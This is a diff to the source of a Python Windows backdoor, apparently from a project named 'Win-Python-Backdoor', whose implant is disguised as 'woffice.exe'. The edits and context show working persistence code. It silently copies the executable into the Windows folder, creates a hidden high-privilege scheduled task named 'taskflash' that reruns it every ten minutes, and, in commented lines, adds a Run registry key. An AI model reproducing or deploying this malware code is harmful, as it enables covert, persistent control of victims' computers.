@@ -28,10 +28,10 @@ from time import sleep
 import _winreg
 
 #cd \python27
-#copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\woffice.py C:\Python27
+#copy /y C:%homepath%\Documents\GitHub\Win-Python-Backdoor\woffice.py C:\Python27
 #cd \python27_64
 #copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\woffice.py C:\Python27_64
-#python C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\setwoffice.py py2exe --includes calendar,email,locale
+#python C:%homepath%\Documents\GitHub\Win-Python-Backdoor\setwoffice.py py2exe --includes calendar,email,locale
 
 def getProxy():
     try:
@@ -109,7 +109,7 @@ try:
         #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +suser+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
         #subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
         subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +swin+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
-        subprocess.call("schtasks /create  /sc minute /mo 1 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("schtasks /create  /sc minute /mo 10 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
 except Exception,e:
     text_file = open(stemp+"\\pippo.txt", "w")
     text_file.write(str(e))
